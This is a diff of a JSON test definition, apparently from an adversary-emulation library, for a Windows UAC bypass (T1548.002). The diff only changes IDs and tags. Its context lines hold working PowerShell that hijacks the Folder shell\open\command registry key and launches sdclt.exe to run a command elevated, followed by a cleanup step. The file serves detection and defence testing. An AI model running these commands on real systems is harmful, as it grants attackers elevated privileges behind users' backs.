@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "5cccc2d3-3be1-4eb8-ab41-6be2a539e11e",
+      "id": "9f763426-bfc9-4dd3-9912-23fa73706312",
       "type": "execute-command",
       "data": {
         "command": "New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value '#{command_to_execute}'\nNew-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\nStart-Process -FilePath $env:windir\\system32\\sdclt.exe\nStart-Sleep -s 3\n",
@@ -16,7 +16,7 @@
       "elevation_required": false
     },
     {
-      "id": "5d8b7921-746e-489b-be1f-cbcdd5d214a9",
+      "id": "bf3a56d3-1cd8-4cc4-aaee-c2eebbac1bca",
       "type": "execute-command",
       "data": {
         "command": "Remove-Item -Path \"HKCU:\\Software\\Classes\\Folder\" -Recurse -Force -ErrorAction Ignore\n",
@@ -27,19 +27,19 @@
   ],
   "flows": [
     {
-      "s": "5cccc2d3-3be1-4eb8-ab41-6be2a539e11e",
+      "s": "9f763426-bfc9-4dd3-9912-23fa73706312",
       "p": "on-success",
-      "o": "5d8b7921-746e-489b-be1f-cbcdd5d214a9"
+      "o": "bf3a56d3-1cd8-4cc4-aaee-c2eebbac1bca"
     },
     {
-      "s": "5cccc2d3-3be1-4eb8-ab41-6be2a539e11e",
+      "s": "9f763426-bfc9-4dd3-9912-23fa73706312",
       "p": "on-failure",
-      "o": "5d8b7921-746e-489b-be1f-cbcdd5d214a9"
+      "o": "bf3a56d3-1cd8-4cc4-aaee-c2eebbac1bca"
     }
   ],
   "tags": [
-    "T1548.002",
-    "atomic-red-team"
+    "T1548",
+    "T1548.002"
   ],
   "input_arguments": [
     {
